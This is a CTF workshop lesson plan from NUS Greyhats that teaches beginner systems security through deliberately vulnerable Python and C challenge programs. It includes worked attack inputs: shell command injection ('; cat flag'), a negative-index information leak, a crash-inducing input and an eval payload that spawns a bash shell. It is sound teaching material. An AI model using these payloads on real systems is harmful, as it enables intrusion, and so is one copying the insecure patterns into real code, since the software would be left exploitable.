CTF 101 Systems Security Lesson Plan
====================================

Assumptions
-----------

* Knowledge of C/C++
* Knowledge of Linux/Unix Systems

Topics to Cover
---------------

* Agenda
* Introduction to NUS Greyhats
    * /usr/bin/whoami
* Introduction to CTFs
    * What is a CTF?
    * Styles of CTFs
    * CTF 101
* Introduction to the Pico Platform
    * Accessing the CTF101 Scoreboard
    * CTF101 Infrastructure
    * Flag Formats
    * Necessary Tools
* Introduction to Software Exploitation
    * Scripting Languages
        * Source code auditing
        * Classes of Vulnerabilities
        * Demonstration: Classes of Vulnerabilities
    * Contrast between Scripts and Binaries
* Conclusion

Workshop Agenda
===============

CTF101 is an information security workshop organised by the NUS Greyhats in the
style of an information security CTF, a competition of hacking skill, to impart
the basics of offensive systems and web security.

This workshop does not follow any formal syllabus or framework published by any
academic or commercial entity and is aimed at the beginner level. It is aimed to
run for 8 hours over two days, with 4 hours given to Systems Security, and 4
hours given to Web Security.


Introduction to NUS Greyhats
============================

NUS Greyhats
------------

The NUS Greyhats is an information security special interest group in NUS. We
organise security sharing talks, workshops (like this one), and internal
discussions on novel security research and news. In addition, we also
participate in local and international information security CTF competitions.

/usr/bin/whoami
---------------

I am amon, an information security undergraduate at NUS. I am a member of the
NUS Greyhats core team and the designer of this lesson. I am the founder of the
Nandy Narwhals CTF team and co-founder of the Dystopian Narwhals CTF team. I
have been playing in CTF competitions for more than five years, both local and
international.

I am a Singapore Polytechnic Diploma in Information Security Management alumni
and have organised multiple CTFs, the latest being Dystopia CTF, an introductory
CTF, for the students at SP.

For more information about my CTF teams, some tutorials and for past CTF
writeups, please see the following links:

* [Nandy Narwhals and Dystopian Narwhals site](http://nandynarwhals.org)
* [CTFtime Profile](https://ctftime.org/team/10339)
* [My CTF Partner's Dystopian Narwhals site](http://iwanttoplayaga.me)


Introduction to CTFs
====================

What is a CTF?
--------------

CTF is short for 'Capture the Flag'. In our context, CTF competitions are
infomation security competitions in which participants compromise security to
bypass access control protections in order to obtain a piece of privileged
information called the 'flag'.

Styles of CTFs
--------------

There are two main styles of CTFs:

1. Jeopardy
2. Attack/Defence

### Jeopardy

Jeopardy style CTF competitions feature player vs organiser gameplay where
challenges are packaged in discrete units with a given description and
accompanying challenge material. The challenge material is often hosted on
organiser controlled systems. These challenges are assigned a set number of
points which are granted to the team on completion of the task by entering the
flag in the scoreboard. In some competitions, the challenges are released slowly
over the course of the competition.

Some examples of Jeopardy style CTFs are:

* Hack.lu
* DEFCON CTF Qualifiers
* PoliCTF

### Attack/Defence

Attack/Defence style CTF competitions feature player vs player gameplay where
teams have to simultaenously defend their systems while attacking the competing
team's systems. These systems play host to vulnerable binaries which have to be
kept running and accessible. Teams are penalised if their services are
non-responsive. The objective of attacking is to exploit these vulnerable
services, retrieve the flag, and submit it for points. Once arbitrary control is
achieved, there can be potential for post-exploitation such as denial-of-service
attacks on the service.

Some examples of Attack/Defence style CTFs are:

* Hack in the Box KUL
* DEFCON CTF Finals
* UCSB's iCTF

### Hybrid

Of course, CTFs can be a combination of the two styles. One such example would
be the Cyber Defenders Discovery Camp organised by DSTA.

CTF101
------

We will be employing the analogue of the Jeopardy style CTF for this workshop
to impart some basic security skills.


Introduction to the Pico Platform
=================================

We will be using the PicoCTF Platform 2 as our scoreboard to keep track of
everyone's progress in this workshop.

Accessing the CTF101 Scoreboard
-------------------------------

To access the CTF101 Scoreboard, please visit (the server has been shut off,
please see [this](instructions.md) for instructions on how to host the
challenges on your own machine) in your browser and sign up for an account.

I highly recommending signing up individually instead of in teams.

CTF101 Infrastructure
---------------------

There are two domains involved in this lecture:

1. (server is down)
2. (server is down)

Please don't attack any other systems.

Flag Formats
------------

Flag formats are a very recent development within CTFs but they have grown to be
a key and crucial part of a quality one. They prevent ambiguity when solving
challenges.

In CTF101, our flag format will be flag{SomeWordsHere}. Please note that there
are exceptions to this rule in some CTFs. It will be explicitly indicated if
there are deviations to how the flag is accepted. When entering the flag into
the scoreboard always include the flag{} encapsulations.

Necessary Tools
---------------

Before we begin, I'd like to do a quick check to see if everyone has the
required tools installed.

At the minimum, you should have a Linux virtual machine with the following to
complete the practicals:

1. python3
2. netcat
3. ssh


Example Challenge: Sanity Check
-------------------------------

Now, just to get everyone started with some points, and to familiarise everyone
with how flag submissions work with the scoreboard, we include a sanity check
challenge. Sanity check challenges are also useful in telling teams who sign up
for fun against teams who actually solve challenges in CTFs.

To complete this challenge, simply download the file and submit the flag.


Introduction to Software Exploitation
=====================================

Categories of Software
----------------------

We will cover two types of applications in this workshop:

1. Scripts
2. Compiled Binaries

We will briefly introduce what scripting languages are, their use in modern
systems, and the common insecure coding problems introduced by programmers.

On compiled binaries, we will be skimming the very surface as a teaser to
further workshops in the area of software exploitation through memory corruption
bugs.

Scripting Languages
-------------------

Scripting languages like Python, Ruby, Perl, or Bash are used to write
memory-safe and quickly developed programs that run on top of an interpreter
which are often written in a systems language like C. While vulnerabilities do
exist within the interpreter, exploitation of the program logic at the higher
level is more feasible with the exposed attack surface.

### Source Code Auditing

The source code for scripts are usually readily available and can be used to
discover vulnerabilities. For example, let's take a look at this simple Python
script that allows a user to ping an arbitrary ip address.

#### Practical 1: Ping

The details and the file for the practical in this example may be found on the
Pico CTF scoreboard.

```python
import sys
import subprocess


def main():
    sys.stdout.write("Enter the IP address or domain of the website you wish"
                     " to ping: ")
    sys.stdout.flush()
    ip = sys.stdin.readline()
    print(subprocess.getoutput("ping -c 1 " + ip))

if __name__ == "__main__":
    main()
```

Before trying anything, download the file to your Linux system and attempt to
understand what the program does. Modify the file with print statements to
inspect the internal state of the program as it progresses in order to do so.
Make sure you understand what the *subprocess.getoutput* command is doing by
looking up the Python documentation before continuing.

Exploitation of a program usually begins with processing untrusted user input
without the proper handling. In this example, the user is prompted to supply an
IP address or a domain name to send a single ICMP ping packet. The output of the
ping command is printed to the user.

Now, this may look like a very simple script, but it is vulnerable to arbitrary
shell command injection. This occurs because the user input is directly
concatenated to the subprocess.getoutput call resulting in a malicious actor
being able to supply the following:

```
google.com; ls
```

which results in this full command being executed:

```
ping -c 1 google.com; ls
```

Now, the flag file is usually in the current directory in a CTF. So assuming
that there is a file named 'flag' in the same directory, we may read it by
injecting the following:

```
google.com; cat flag
```

Classes of Vulnerabilities
--------------------------

Now that we have learnt that one has the option of analysing and auditing the
source code for vulnerabilities, we may delve deeper into what vulnerabilities
actually exist in the wild. One method of classifying a vulnerability is the
extent of control it grants the attacker. We have five primary levels of control
in increasing severity:

1. Information Leak
2. Denial of Service
3. Arbitrary File Write
4. Arbitrary Code Execution
5. Privilege Escalation

#### Information Leak

An information leak (infoleak for short), is a vulnerability that when
exploited, reveals privileged information about the system or application to the
attacker. The effects of this information being in the control of an attacker
can be varying. Information an attack might be interested in include:

* Password Hashes
* Source Codes
* Binaries
* Pointers and Addresses
* libc Version

While infoleaks are not dangerous by themselves, they are used in conjunction
with another vulnerability to obtain more control over a system.

#### Denial of Service

Denial of Service vulnerabilities are broad and can be destructive or
non-destructive. The common theme between them is that they obstruct and prevent
legitimate users from accessing the service. While Denial of Service attacks can
be caused by congestion of network resources, we focus more on the
vulnerabilties that exist inherently in the application logic.

#### Arbitrary File Write

Arbitrary file write vulnerabilties allow an attacker to create/overwrite files
on the file system with controlled content. Now, this is dangerous on multiple
levels. If the application is privileged and is capable of overwriting system
files such as /etc/shadow and /etc/passwd, an attacker may insert their own
users to log on to the system through SSH. If the application is not privileged,
but has write access to their own directories, an attacker may insert content
that grant access or even perform arbitrary code execution.

An example of arbitrary code execution often appears when exploiting PHP web
applications where arbitrary PHP code is written to the file system and
triggered by the attacker by manipulating the web server to process the file.

#### Arbitrary Code Execution

Certain vulnerabilities grant arbitrary code execution which allows an attacker
to coerce the system into performing any operation she wishes. This may manifest
as a result of injection of evaluated data such as shell commands or scripts, or
on a more fundamental level such as taking control of the instruction pointer to
execute your own machine code. Arbitrary code execution is very closely tied to
privilege escalation where hijacking the control flow of a binary with
privileged access results in granting these privileges to the attacker.

#### Privilege Escalation

Privilege escalation vulnerabilities can exist in multiple forms and are not
necessarily arbitrary code execution bugs. They often are though. These
vulnerabilties, when exploited result in the attacker obtaining higher level
rights such as the administrator's or root's.

At a more advanced level, there exists vulnerabilities within the kernel of
the operating system. These vulnerabilities usually allow an attacker with local
access to the system to escalate their rights from a restricted user to root.


Classes of Vulnerabilities: Demonstrated
----------------------------------------

Having briefly listed and described the classes of vulnerabilities that may be
encountered in a system, we will further elaborate through practical examples.

### Practical 2: Information Leak

Please look at the problem on the scoreboard to download the source file and
obtain the connection details for this problem. Now, take a look at the source:

```python
import sys

FLAG = "XXXXXXXXXXXXXXXX"
PUBLIC_DATA = "RainRainGoAwayComeAgainAnotherDay"


def main():
    haystack = FLAG + PUBLIC_DATA
    write("Welcome to the Infoleak!\n")
    write("Please enter an index: ")

    index = len(FLAG) + int(sys.stdin.readline())
    write("Giving you the data from index %d...\n" % index)
    write("Here's the data: %s\n" % haystack[index:])


def write(data):
    sys.stdout.write(data)
    sys.stdout.flush()


if __name__ == "__main__":
    main()
```

Now, in a CTF, a means of simulating application specific secrets in challenge
applications involve the organisers including a variable for the flag in the
source code, but ultimately redacting it in the copy distributed to the
participants. The real copy with a real flag is hosted on the organiser's
servers and exploitation of the remote program will yield the correct flag.

The goal of a hacker is to manipulate the program into doing something the
programmer did not intend the program to do. In this example, it is obvious the
programmer intended for the user to supply positive integers to display the
public data.

Let's try to play with it fairly first:

```
$ python infoleak.py
Welcome to the Infoleak!
Please enter an index: 0
Giving you the data from index 16...
Here's the data: RainRainGoAwayComeAgainAnotherDay
```

Now, certain things in the output should raise some red flags here. Notice how
when entering a zero index, we are given data from index 16. Now, looking back
at the source code, we can observe that the data comes from the 'haystack'
variable. This variable is a concatenation of the 'FLAG' and 'PUBLIC\_DATA' and
our supplied index is added to the length of 'FLAG' which means any 'legitimate'
value that we type will result in the calculated index landing within the 'safe'
public data.

You may not have recognised it, but our first infoleak vulnerability is here.
When supplying an index of zero, we can obtain the length of the flag. We'll use
this information later. Let's try to make the program behave in a non-intended
manner right now. Notice that the program is using int() to convert a string
into an integer. Most programming languages support inputs such as "1", "999",
and with some parameters, "4e3bc" but remember, negative integers are integers
too and are properly handled by these parsers. Let's see if it works:

```
$ python infoleak.py
Welcome to the Infoleak!
Please enter an index: -1
Giving you the data from index 15...
Here's the data: XRainRainGoAwayComeAgainAnotherDay
```

And it does! Supplying a negative integer will allow us to read data from the
non-public segment of the 'haystack'. It's just a matter of applying the
information of the flag length we obtained just now to get the entire flag.

```
python infoleak.py
Welcome to the Infoleak!
Please enter an index: -16
Giving you the data from index 0...
Here's the data: XXXXXXXXXXXXXXXXRainRainGoAwayComeAgainAnotherDay
```


### Practical 3: Denial of Service

Demonstrating a denial of service is tricky for a large group. So instead of
having a problem that's hosted on my servers, we shall demonstrate this
vulnerability by running a Python server on your own machines.

Download the source file from the scoreboard or copy it from here. It should
look exactly like this:

```python
service.py
import socket
import sys

HOST = ''
PORT = 8888


def main():
    s = socket.socket()
    try:
        s.bind((HOST, PORT))
    except:
        print("Error")
        sys.exit()

    s.listen(10)

    while True:
        conn, addr = s.accept()
        logic(conn)


def logic(conn):
    conn.sendall(b"Hello, what is your age? Enter here: ")
    age = int(conn.recv(50).strip())
    print("Person is age %d" % age)
    conn.sendall(b"Thank you. You are old.")
    conn.close()


if __name__ == "__main__":
    main()
```

To run this simply do the following in your terminal:

```
$ python denialofservice.py

```

Now, to connect to the simple listening server, we can use netcat. The default
port is 8888 so in a separate terminal, we do this:

```
$ nc localhost 8888
Hello, what is your age? Enter here: 10
Thank you. You are old
```

This server accepts multiple connections. Try the netcat command a couple of
times to make sure. Now, the objective of this example is to deny other users
access to the server so it should be suffice to crash the server to prevent
others from accessing the server.

Sidenote: We can check whether the server is actually accepting connections by
making netcat verbose.

```
$ nc -v localhost 8888
localhost [127.0.0.1] 8888 (ddi-tcp-1) open
Hello, what is your age? Enter here: 1
Thank you. You are old.
$ nc -v localhost 8888
localhost [127.0.0.1] 8888 (ddi-tcp-1) open
Hello, what is your age? Enter here: 1
Thank you. You are old.
```

Now, we want to stop the server forcefully to prevent others from accessing the
server. We may do this by forcing the server to raise an exception. Review the
source and figure out why the following input causes a crash.

```
$ nc -v localhost 8888
localhost [127.0.0.1] 8888 (ddi-tcp-1) open
Hello, what is your age? Enter here: crash
```

Looking at the terminal where you ran the listening server you get:

```
$ python denialofservice.py
Person is age 10
Person is age 1
Person is age 1
Person is age 1
Traceback (most recent call last):
  File "denialofservice.py", line 32, in <module>
    main()
  File "denialofservice.py", line 20, in main
    logic(conn)
  File "denialofservice.py", line 25, in logic
    age = int(conn.recv(50).strip())
ValueError: invalid literal for int() with base 10: b'crash'
```

Verify that others are unable to access the server:

```
$ nc -v localhost 8888
localhost [127.0.0.1] 8888 (ddi-tcp-1): Connection refused
```

And we are done. Here is your flag: flag{crash}.


### Practical 4: Arbitrary File Write

Let's take a look at a more involved example this time. Download the source code
 on the scoreboard. Take five minutes to try out the code locally. Understand
 what the program requires in terms of directory structure and files. Discern
 what the behaviour of the program is and try to identify the inherent
 vulnerabilities.

```python
#! /usr/bin/python

import sys


logged_in = False
admin = False
FLAG = open("flag").read()


def main():
    write("Secret Storage 1.0\n")
    while True:
        if not logged_in:
            write("You are not logged in. Please choose one option: \n")
            write("1. Log in\n")
            write("2. Create Account\n")

            choice = sys.stdin.readline().strip()

            write("Please enter your name: ")
            name = sys.stdin.readline().strip()
            write("Please enter your password: ")
            password = sys.stdin.readline().strip()

            if choice == "1":
                if validate(name, password):
                    write("Success!\n")
                else:
                    write("Failure!\n")
            elif choice == "2":
                create_user(name, password)
            else:
                write("Invalid choice.\n")

        else:
            write("Welcome %s!\n" % logged_in)
            write("1. Retrieve secret\n")
            write("2. Store secret\n")
            write("3. Read admin secret\n")

            choice = sys.stdin.readline().strip()

            if choice == "1":
                write("Which secret would you like to retrieve: ")
                secretname = sys.stdin.readline().strip()
                retrieve_secret(secretname)
            elif choice == "2":
                write("What is the name of the secret you want to store: ")
                secretname = sys.stdin.readline().strip()
                write("What secret would you like to store: ")
                secret = sys.stdin.readline().strip()
                store_secret(secretname, secret)
            elif choice == "3":
                reveal_secret()
            else:
                write("Invalid choice.\n")


def retrieve_secret(secretname):
    if "flag" in secretname:
        write("Privileged secret requires admin writes\n")
        return
    try:
        with open("secrets/%s" % (secretname)) as secretfile:
            write("Here's your secret: %s\n" % secretfile.read())
    except:
        write("No such secret\n")


def store_secret(secretname, secret):
    try:
        with open("secrets/%s" % (secretname), "w") as secretfile:
            secretfile.write(secret)
            write("Secret written!\n")
    except:
        write("Error in writing secret.\n")


def reveal_secret():
    if admin:
        write("Here is the admin's secret: %s\n" % FLAG)
    else:
        write("You are not admin.\n")


def validate(name, password):
    try:
        with open("accounts/" + name) as accountfile:
            adminflag, filepassword = accountfile.read().split(":")
            if password == filepassword:
                global logged_in
                logged_in = name
                if adminflag == "1":
                    global admin
                    admin = True
                return True
    except:
        write("No such account.\n")
    return False


def create_user(name, password):
    with open("accounts/" + name, "w") as accountfile:
        accountfile.write("0:" + password)
    write("Account created. Please log in.\n")


def write(data):
    sys.stdout.write(data)
    sys.stdout.flush()


if __name__ == "__main__":
    main()
```

This is a pretty long one so we'll identify things step by step in the lecture.


### Practical 5: Arbitrary Code Execution

Itching to pop a shell yet? In this practical example, you'll finally get to.
Download the source from the scoreboard and review it.

```python
#! /usr/bin/python

import sys


def main():
    write("SuperCalculator (e.g. 2+2): ")
    eqn = sys.stdin.readline().strip()
    answer = eval(eqn)
    write("%s = %s\n" % (eqn, answer))


def write(data):
    sys.stdout.write(data)
    sys.stdout.flush()


if __name__ == "__main__":
    main()
```

Now, whenever a script uses an evaluate statement over user supplied input an
exploitable bug is bound to be discovered within. In this case, arbitrary python
code can be written as payload to spawn a remote shell. However, we have to be
very careful to write it as one line due to the nature of the code. Try to get a
usable shell!

There are multiple solutions, but here is one:

```
$ python codeexec.py
SuperCalculator (e.g. 2+2): __import__("os").system("bash")
$
```

### Practial 6: Privilege Escalation

Now let's try something different. SSH into the server.

```
$ ssh escalate@play.nusgreyhats.org
escalate@play.nusgreyhats.org's password:
Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.13.0-57-generic x86_64)
$ ls -l
total 16
-rwxr-sr-x 1 root privesca 7560 Aug 14 16:32 escalate
-rw-r--r-- 1 root root      562 Aug 14 16:32 escalate.c
-r--r----- 1 root privesca   31 Aug 14 16:32 flag
$
```

This is very typical of a local exploit challenge (as opposed to the mostly
remote ones we have been doing). Notice the setgid bit is set for the executable
binary escalate. This means that the binary will be run with the privileges of
that group. Now, let's get more information about the binary by looking at the
source code. This is our first binary practical :)

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int check(char *user_pass, char *pass) {
    int index = 0;
    while (user_pass[index] != 0) {
        if (user_pass[index] != pass[index]) {
            return 0;
        }
        index++;
    }
    return 1;
}

int main(int argc, char *argv[]) {
    char user_pass[256];
    printf("Password: ");
    scanf("%255s", user_pass);
    if (check(user_pass, "XXXXXXXXXXXXXX")) {
        printf("Win!\n");
        setuid(0);
        system("/bin/sh");
    }
    else {
        printf("Fail!\n");
    }
}
```

Looks like the password's been redacted. However, there's an insecure password
check in the check routine. Can you figure it out?

```
$ id
uid=1006(escalate) gid=1006(escalate) groups=1006(escalate)
$ ./escalate
Password: <redacted>
Win!
$ id
uid=1006(escalate) gid=1006(escalate) egid=1005(privesca) groups=1006(escalate)
$
```

Contrast between Scripts and Binaries
-------------------------------------

Now, having experienced both scripts and binaries in the practicals, what are
the immediate differences that are apparent?

To be discussed during the workshop.

Conclusion
==========

That is it for a high level overview of offensive Systems Security but we'll
have a few teasers following this for those who want to get into the more
advanced topics of binary exploitation.
